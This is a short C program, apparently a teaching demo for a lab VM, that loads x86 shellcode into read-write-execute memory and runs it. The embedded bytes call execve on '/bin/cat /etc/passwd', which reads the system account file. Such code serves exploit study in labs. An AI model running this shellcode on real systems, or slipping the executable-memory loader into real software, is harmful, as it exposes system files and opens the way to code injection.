#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

/* 교육용 Kali VM 전용: RWX 메모리를 실서비스에 사용하지 마세요. */
unsigned char shellcode[] = 
"\xeb\x19\x5e\x31\xc0\x88\x46\x08\x88\x46\x14\x8d\x1e\x8d\x7e\x09"
"\x50\x57\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xe8\xe2\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x63\x61\x74\x41\x2f\x65\x74\x63\x2f\x70\x61"
"\x73\x73\x77\x64\x41";

int main(void) {
    size_t len = sizeof(shellcode) - 1;
    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }
    memcpy(mem, shellcode, len);
    printf("Shellcode size: %zu bytes\n", len);
    fflush(stdout);
    ((void (*)(void))mem)();
    perror("execve failed");
    return 1;
}
